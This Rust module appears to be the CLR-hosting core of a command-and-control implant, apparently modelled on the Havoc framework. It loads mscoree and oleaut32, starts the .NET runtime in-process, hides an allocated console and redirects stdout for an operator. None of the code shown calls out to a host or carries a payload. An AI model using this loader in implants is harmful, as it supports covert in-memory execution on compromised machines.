//! COM/CLR runtime infrastructure: types, constants, session state, and helpers.
//!
//! Shared by [`super::assembly`] and [`super::appdomain`].  All items are
//! `pub(super)` — callers outside the `dotnet` module use the public API in
//! `mod.rs`.

#![allow(unsafe_code, clippy::missing_transmute_annotations)]

use std::ffi::c_void;
use tracing::{debug, error};

// ── COM GUID ────────────────────────────────────────────────────────────────

#[repr(C)]
#[derive(Clone, Copy)]
pub(super) struct Guid {
    pub(super) data1: u32,
    pub(super) data2: u16,
    pub(super) data3: u16,
    pub(super) data4: [u8; 8],
}

pub(super) static CLSID_CLR_META_HOST: Guid = Guid {
    data1: 0x9280188d,
    data2: 0x0e8e,
    data3: 0x4867,
    data4: [0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde],
};

pub(super) static CLSID_COR_RUNTIME_HOST: Guid = Guid {
    data1: 0xcb2f6723,
    data2: 0xab3a,
    data3: 0x11d2,
    data4: [0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e],
};

pub(super) static IID_ICLR_META_HOST: Guid = Guid {
    data1: 0xD332DB9E,
    data2: 0xB9B3,
    data3: 0x4125,
    data4: [0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16],
};

pub(super) static IID_ICLR_RUNTIME_INFO: Guid = Guid {
    data1: 0xBD39D1D2,
    data2: 0xBA2F,
    data3: 0x486a,
    data4: [0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91],
};

pub(super) static IID_ICOR_RUNTIME_HOST: Guid = Guid {
    data1: 0xcb2f6722,
    data2: 0xab3a,
    data3: 0x11d2,
    data4: [0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e],
};

pub(super) static IID_APP_DOMAIN: Guid = Guid {
    data1: 0x05F696DC,
    data2: 0x2B29,
    data3: 0x3663,
    data4: [0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13],
};

// ── OLE Automation types ─────────────────────────────────────────────────────

/// COM VARIANT (16 bytes on x64).
#[repr(C)]
#[derive(Clone, Copy)]
pub(super) struct Variant {
    pub(super) vt: u16,
    pub(super) reserved1: u16,
    pub(super) reserved2: u16,
    pub(super) reserved3: u16,
    /// Union data — 8 bytes.  We access it as either a pointer or a u64.
    pub(super) data: u64,
}

impl Variant {
    pub(super) const fn empty() -> Self {
        Self { vt: 0, reserved1: 0, reserved2: 0, reserved3: 0, data: 0 }
    }
}

#[repr(C)]
pub(super) struct SafeArrayBound {
    pub(super) c_elements: u32,
    pub(super) l_lbound: i32,
}

// VARIANT type constants.
pub(super) const VT_UI1: u16 = 17;
pub(super) const VT_BSTR: u16 = 8;
pub(super) const VT_VARIANT: u16 = 12;
pub(super) const VT_ARRAY: u16 = 0x2000;

// HRESULT success.
pub(super) const S_OK: i32 = 0;

// ── COM vtable indices (counted from Havoc Clr.h) ────────────────────────────

// IUnknown
pub(super) const IUNKNOWN_QUERY_INTERFACE: usize = 0;
pub(super) const IUNKNOWN_RELEASE: usize = 2;

// ICLRMetaHost : IUnknown
pub(super) const META_HOST_GET_RUNTIME: usize = 3;

// ICLRRuntimeInfo : IUnknown
pub(super) const RUNTIME_INFO_GET_INTERFACE: usize = 9;
pub(super) const RUNTIME_INFO_IS_LOADABLE: usize = 10;

// ICorRuntimeHost : IUnknown
pub(super) const COR_HOST_START: usize = 10;
pub(super) const COR_HOST_STOP: usize = 11;
pub(super) const COR_HOST_CREATE_DOMAIN: usize = 12;
pub(super) const COR_HOST_UNLOAD_DOMAIN: usize = 20;

// _AppDomain (IDispatch-based, large vtable)
pub(super) const APP_DOMAIN_LOAD_3: usize = 45;

// _Assembly
pub(super) const ASSEMBLY_ENTRY_POINT: usize = 16;

// _MethodInfo
pub(super) const METHOD_INFO_INVOKE_3: usize = 37;

// ── Pipe / console constants ──────────────────────────────────────────────────

pub(super) const PIPE_BUFFER: u32 = 0x10000 * 5;
pub(super) const STD_OUTPUT_HANDLE: u32 = 0xFFFF_FFF5; // (DWORD)-11

// ── Function pointer types for dynamically loaded DLLs ───────────────────────

pub(super) type ClrCreateInstanceFn =
    unsafe extern "system" fn(*const Guid, *const Guid, *mut *mut c_void) -> i32;

pub(super) type SafeArrayCreateFn =
    unsafe extern "system" fn(vt: u16, dims: u32, bounds: *const SafeArrayBound) -> *mut c_void;

pub(super) type SafeArrayCreateVectorFn =
    unsafe extern "system" fn(vt: u16, lower: i32, count: u32) -> *mut c_void;

pub(super) type SafeArrayAccessDataFn =
    unsafe extern "system" fn(sa: *mut c_void, data: *mut *mut c_void) -> i32;

pub(super) type SafeArrayUnaccessDataFn = unsafe extern "system" fn(sa: *mut c_void) -> i32;

pub(super) type SafeArrayPutElementFn =
    unsafe extern "system" fn(sa: *mut c_void, indices: *const i32, value: *const c_void) -> i32;

pub(super) type SafeArrayDestroyFn = unsafe extern "system" fn(sa: *mut c_void) -> i32;

pub(super) type SysAllocStringFn = unsafe extern "system" fn(s: *const u16) -> *mut u16;

pub(super) type SysFreeStringFn = unsafe extern "system" fn(s: *mut u16);

/// Bundle of oleaut32 function pointers resolved at runtime.
pub(super) struct OleAutApi {
    pub(super) safe_array_create: SafeArrayCreateFn,
    pub(super) safe_array_create_vector: SafeArrayCreateVectorFn,
    pub(super) safe_array_access_data: SafeArrayAccessDataFn,
    pub(super) safe_array_unaccess_data: SafeArrayUnaccessDataFn,
    pub(super) safe_array_put_element: SafeArrayPutElementFn,
    pub(super) safe_array_destroy: SafeArrayDestroyFn,
    pub(super) sys_alloc_string: SysAllocStringFn,
    pub(super) sys_free_string: SysFreeStringFn,
}

// ── COM vtable call helper ────────────────────────────────────────────────────

/// Read a function pointer from a COM object's vtable at the given slot.
///
/// # Safety
///
/// `this` must be a valid COM interface pointer whose first pointer-sized
/// field points to a vtable array.  `index` must be within bounds.
pub(super) unsafe fn vtable_fn(this: *mut c_void, index: usize) -> *const c_void {
    let vtable = *(this as *const *const *const c_void);
    *vtable.add(index)
}

// ── UTF-16 helpers ────────────────────────────────────────────────────────────

/// Encode a Rust `&str` as a null-terminated UTF-16LE wide string.
pub(super) fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0u16)).collect()
}

// ── Session state (owns COM pointers; Drop cleans up) ─────────────────────────

/// Holds all COM interface pointers, SafeArrays, and pipe handles
/// acquired during a CLR hosting session.  [`Drop`] releases them in
/// the correct reverse order so every error path gets automatic cleanup.
pub(super) struct ClrSession {
    // oleaut32 API (needed for SafeArrayDestroy in Drop)
    pub(super) ole: Option<OleAutApi>,

    // COM interfaces (null = not yet acquired)
    pub(super) meta_host: *mut c_void,
    pub(super) runtime_info: *mut c_void,
    pub(super) cor_runtime_host: *mut c_void,
    pub(super) app_domain_thunk: *mut c_void,
    pub(super) app_domain: *mut c_void,
    pub(super) assembly: *mut c_void,
    pub(super) method_info: *mut c_void,

    // SafeArrays
    pub(super) safe_array: *mut c_void,
    pub(super) method_args: *mut c_void,

    // Pipe handles
    pub(super) pipe_read: *mut c_void,
    pub(super) pipe_write: *mut c_void,

    // Stdout redirection state
    pub(super) original_stdout: *mut c_void,
    pub(super) stdout_redirected: bool,
}

impl ClrSession {
    pub(super) fn new() -> Self {
        Self {
            ole: None,
            meta_host: std::ptr::null_mut(),
            runtime_info: std::ptr::null_mut(),
            cor_runtime_host: std::ptr::null_mut(),
            app_domain_thunk: std::ptr::null_mut(),
            app_domain: std::ptr::null_mut(),
            assembly: std::ptr::null_mut(),
            method_info: std::ptr::null_mut(),
            safe_array: std::ptr::null_mut(),
            method_args: std::ptr::null_mut(),
            pipe_read: std::ptr::null_mut(),
            pipe_write: std::ptr::null_mut(),
            original_stdout: std::ptr::null_mut(),
            stdout_redirected: false,
        }
    }
}

impl Drop for ClrSession {
    fn drop(&mut self) {
        // SAFETY: All COM Release calls and handle closures follow the
        // standard COM release protocol.  Pointers are only non-null when
        // they were successfully acquired from a prior COM call.

        // Restore stdout first.
        if self.stdout_redirected {
            unsafe {
                windows_sys::Win32::System::Console::SetStdHandle(
                    STD_OUTPUT_HANDLE,
                    self.original_stdout,
                );
            }
        }

        // Destroy SafeArrays.
        if let Some(ref ole) = self.ole {
            if !self.method_args.is_null() {
                unsafe {
                    (ole.safe_array_destroy)(self.method_args);
                }
            }
            if !self.safe_array.is_null() {
                unsafe {
                    (ole.safe_array_destroy)(self.safe_array);
                }
            }
        }

        // Release COM objects in reverse acquisition order.
        unsafe {
            release_if_nonnull(self.method_info);
            release_if_nonnull(self.assembly);
            release_if_nonnull(self.app_domain);

            // Unload domain and stop the runtime before releasing.
            if !self.cor_runtime_host.is_null() {
                if !self.app_domain_thunk.is_null() {
                    let unload: unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32 =
                        std::mem::transmute(vtable_fn(
                            self.cor_runtime_host,
                            COR_HOST_UNLOAD_DOMAIN,
                        ));
                    let _ = unload(self.cor_runtime_host, self.app_domain_thunk);
                }
                let stop: unsafe extern "system" fn(*mut c_void) -> i32 =
                    std::mem::transmute(vtable_fn(self.cor_runtime_host, COR_HOST_STOP));
                let _ = stop(self.cor_runtime_host);
            }

            release_if_nonnull(self.app_domain_thunk);
            release_if_nonnull(self.cor_runtime_host);
            release_if_nonnull(self.runtime_info);
            release_if_nonnull(self.meta_host);
        }

        // Close pipe handles.
        if !self.pipe_write.is_null() {
            unsafe {
                windows_sys::Win32::Foundation::CloseHandle(self.pipe_write);
            }
        }
        if !self.pipe_read.is_null() {
            unsafe {
                windows_sys::Win32::Foundation::CloseHandle(self.pipe_read);
            }
        }
    }
}

/// Call `IUnknown::Release` if the pointer is non-null.
///
/// # Safety
///
/// `ptr` must be either null or a valid COM interface pointer.
pub(super) unsafe fn release_if_nonnull(ptr: *mut c_void) {
    if !ptr.is_null() {
        let release: unsafe extern "system" fn(*mut c_void) -> u32 =
            std::mem::transmute(vtable_fn(ptr, IUNKNOWN_RELEASE));
        release(ptr);
    }
}

// ── DLL loading helpers ───────────────────────────────────────────────────────

/// Resolve a single function from a module handle.
///
/// # Safety
///
/// `module` must be a valid `HMODULE` and `name` must be a null-terminated
/// ASCII byte slice.
pub(super) unsafe fn get_proc(
    module: *mut c_void,
    name: &[u8], // must be null-terminated
) -> Result<*const c_void, String> {
    // SAFETY: module is a valid HMODULE from LoadLibraryA and name is
    // a valid null-terminated ASCII string.
    let addr = windows_sys::Win32::System::LibraryLoader::GetProcAddress(module, name.as_ptr());
    match addr {
        Some(f) => Ok(f as *const c_void),
        None => Err(format!(
            "GetProcAddress failed for {}",
            String::from_utf8_lossy(&name[..name.len().saturating_sub(1)])
        )),
    }
}

/// Load a DLL by ASCII name.
///
/// # Safety
///
/// `name` must be a null-terminated ASCII byte slice.
pub(super) unsafe fn load_library(name: &[u8]) -> Result<*mut c_void, String> {
    // SAFETY: name is a valid null-terminated ASCII string.
    let h = windows_sys::Win32::System::LibraryLoader::LoadLibraryA(name.as_ptr());
    if h.is_null() {
        Err(format!(
            "LoadLibraryA failed for {}",
            String::from_utf8_lossy(&name[..name.len().saturating_sub(1)])
        ))
    } else {
        Ok(h)
    }
}

/// Load oleaut32.dll and resolve all needed SafeArray / SysAllocString
/// functions.
///
/// # Safety
///
/// Must be called from a context where DLL loading is safe (standard Win32
/// runtime environment).
pub(super) unsafe fn load_oleaut32() -> Result<OleAutApi, String> {
    let h = load_library(b"oleaut32.dll\0")?;
    Ok(OleAutApi {
        safe_array_create: std::mem::transmute(get_proc(h, b"SafeArrayCreate\0")?),
        safe_array_create_vector: std::mem::transmute(get_proc(h, b"SafeArrayCreateVector\0")?),
        safe_array_access_data: std::mem::transmute(get_proc(h, b"SafeArrayAccessData\0")?),
        safe_array_unaccess_data: std::mem::transmute(get_proc(h, b"SafeArrayUnaccessData\0")?),
        safe_array_put_element: std::mem::transmute(get_proc(h, b"SafeArrayPutElement\0")?),
        safe_array_destroy: std::mem::transmute(get_proc(h, b"SafeArrayDestroy\0")?),
        sys_alloc_string: std::mem::transmute(get_proc(h, b"SysAllocString\0")?),
        sys_free_string: std::mem::transmute(get_proc(h, b"SysFreeString\0")?),
    })
}

// ── Console allocation ────────────────────────────────────────────────────────

/// Ensure a console window exists (hidden).  .NET Console.Write needs one.
///
/// # Safety
///
/// Calls Win32 console functions; safe in a normal agent process context.
pub(super) unsafe fn ensure_console() {
    let wnd = windows_sys::Win32::System::Console::GetConsoleWindow();
    if wnd.is_null() {
        windows_sys::Win32::System::Console::AllocConsole();
        let wnd = windows_sys::Win32::System::Console::GetConsoleWindow();
        if !wnd.is_null() {
            // SW_HIDE = 0
            windows_sys::Win32::UI::WindowsAndMessaging::ShowWindow(wnd, 0);
        }
    }
}

// ── CLR version enumeration ───────────────────────────────────────────────────

/// Check installed CLR versions via the Windows registry.
///
/// Returns version strings such as `"v4.0.30319"`.
pub(super) fn enumerate_clr_versions_impl() -> Vec<String> {
    let mut versions = Vec::new();

    // Check for .NET Framework 4.x via registry
    // HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full
    let subkey = b"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\0";
    let mut hkey: *mut c_void = std::ptr::null_mut();

    // SAFETY: calling RegOpenKeyExA to read registry.
    let status = unsafe {
        windows_sys::Win32::System::Registry::RegOpenKeyExA(
            windows_sys::Win32::System::Registry::HKEY_LOCAL_MACHINE,
            subkey.as_ptr(),
            0,
            windows_sys::Win32::System::Registry::KEY_READ,
            &mut hkey,
        )
    };

    if status == 0 {
        let value_name = b"Version\0";
        let mut buf = [0u8; 256];
        let mut buf_len: u32 = buf.len() as u32;
        let mut value_type: u32 = 0;

        let read_status = unsafe {
            windows_sys::Win32::System::Registry::RegQueryValueExA(
                hkey,
                value_name.as_ptr(),
                std::ptr::null(),
                &mut value_type,
                buf.as_mut_ptr(),
                &mut buf_len,
            )
        };

        if read_status == 0 && buf_len > 0 {
            let end = buf_len as usize;
            let version_str = String::from_utf8_lossy(
                &buf[..end.saturating_sub(1)], // strip null terminator
            )
            .to_string();
            if !version_str.is_empty() {
                versions.push(format!("v{version_str}"));
            }
        }

        unsafe {
            windows_sys::Win32::System::Registry::RegCloseKey(hkey);
        }
    }

    // Check for .NET 3.5
    let subkey_35 = b"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v3.5\0";
    let mut hkey_35: *mut c_void = std::ptr::null_mut();
    let status_35 = unsafe {
        windows_sys::Win32::System::Registry::RegOpenKeyExA(
            windows_sys::Win32::System::Registry::HKEY_LOCAL_MACHINE,
            subkey_35.as_ptr(),
            0,
            windows_sys::Win32::System::Registry::KEY_READ,
            &mut hkey_35,
        )
    };
    if status_35 == 0 {
        versions.push("v3.5".to_string());
        unsafe {
            windows_sys::Win32::System::Registry::RegCloseKey(hkey_35);
        }
    }

    // Check for .NET 2.0
    let subkey_20 = b"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v2.0.50727\0";
    let mut hkey_20: *mut c_void = std::ptr::null_mut();
    let status_20 = unsafe {
        windows_sys::Win32::System::Registry::RegOpenKeyExA(
            windows_sys::Win32::System::Registry::HKEY_LOCAL_MACHINE,
            subkey_20.as_ptr(),
            0,
            windows_sys::Win32::System::Registry::KEY_READ,
            &mut hkey_20,
        )
    };
    if status_20 == 0 {
        versions.push("v2.0.50727".to_string());
        unsafe {
            windows_sys::Win32::System::Registry::RegCloseKey(hkey_20);
        }
    }

    // Emit debug log so operator can see what CLR versions were found.
    debug!("enumerate_clr_versions: found {:?}", versions);

    versions
}

/// Initialise the CLR MetaHost and acquire an `ICorRuntimeHost` ready for use.
///
/// Steps:
/// 1. Load `mscoree.dll` → `CLRCreateInstance` → `ICLRMetaHost`
/// 2. `ICLRMetaHost::GetRuntime(net_version)` → `ICLRRuntimeInfo`
/// 3. `ICLRRuntimeInfo::IsLoadable` check
/// 4. `ICLRRuntimeInfo::GetInterface` → `ICorRuntimeHost`
/// 5. `ICorRuntimeHost::Start`
///
/// On success, fills `session.meta_host`, `session.runtime_info`, and
/// `session.cor_runtime_host`.  Returns the oleaut32 API bundle so it can be
/// stored in `session.ole`.
///
/// # Safety
///
/// All pointers in `session` must be null on entry (enforced by `ClrSession::new`).
pub(super) unsafe fn init_clr_host(
    session: &mut ClrSession,
    net_version: &str,
) -> Result<OleAutApi, String> {
    let mscoree = load_library(b"mscoree.dll\0")?;

    let clr_create_instance: ClrCreateInstanceFn =
        std::mem::transmute(get_proc(mscoree, b"CLRCreateInstance\0")?);

    let ole = load_oleaut32()?;

    // CLRCreateInstance → ICLRMetaHost
    let hr = clr_create_instance(&CLSID_CLR_META_HOST, &IID_ICLR_META_HOST, &mut session.meta_host);
    if hr != S_OK {
        error!("CLRCreateInstance failed: HRESULT 0x{hr:08X}");
        return Err(format!("CLRCreateInstance HRESULT 0x{hr:08X}"));
    }
    debug!("CLRCreateInstance succeeded");

    // ICLRMetaHost::GetRuntime → ICLRRuntimeInfo
    let version_wide = to_wide(net_version);
    let get_runtime: unsafe extern "system" fn(
        *mut c_void,
        *const u16,
        *const Guid,
        *mut *mut c_void,
    ) -> i32 = std::mem::transmute(vtable_fn(session.meta_host, META_HOST_GET_RUNTIME));
    let hr = get_runtime(
        session.meta_host,
        version_wide.as_ptr(),
        &IID_ICLR_RUNTIME_INFO,
        &mut session.runtime_info,
    );
    if hr != S_OK {
        error!("ICLRMetaHost::GetRuntime failed: HRESULT 0x{hr:08X}");
        return Err(format!("GetRuntime({net_version}) HRESULT 0x{hr:08X}"));
    }
    debug!("GetRuntime({net_version}) succeeded");

    // ICLRRuntimeInfo::IsLoadable
    let mut loadable: i32 = 0;
    let is_loadable: unsafe extern "system" fn(*mut c_void, *mut i32) -> i32 =
        std::mem::transmute(vtable_fn(session.runtime_info, RUNTIME_INFO_IS_LOADABLE));
    let hr = is_loadable(session.runtime_info, &mut loadable);
    if hr != S_OK || loadable == 0 {
        error!("CLR {net_version} is not loadable (hr=0x{hr:08X}, loadable={loadable})");
        return Err(format!("CLR {net_version} not loadable"));
    }

    // ICLRRuntimeInfo::GetInterface → ICorRuntimeHost
    let get_interface: unsafe extern "system" fn(
        *mut c_void,
        *const Guid,
        *const Guid,
        *mut *mut c_void,
    ) -> i32 = std::mem::transmute(vtable_fn(session.runtime_info, RUNTIME_INFO_GET_INTERFACE));
    let hr = get_interface(
        session.runtime_info,
        &CLSID_COR_RUNTIME_HOST,
        &IID_ICOR_RUNTIME_HOST,
        &mut session.cor_runtime_host,
    );
    if hr != S_OK {
        error!("GetInterface(ICorRuntimeHost) failed: HRESULT 0x{hr:08X}");
        return Err(format!("GetInterface HRESULT 0x{hr:08X}"));
    }
    debug!("ICorRuntimeHost acquired");

    // ICorRuntimeHost::Start
    let start: unsafe extern "system" fn(*mut c_void) -> i32 =
        std::mem::transmute(vtable_fn(session.cor_runtime_host, COR_HOST_START));
    let hr = start(session.cor_runtime_host);
    if hr != S_OK {
        error!("ICorRuntimeHost::Start failed: HRESULT 0x{hr:08X}");
        return Err(format!("Start HRESULT 0x{hr:08X}"));
    }

    Ok(ole)
}
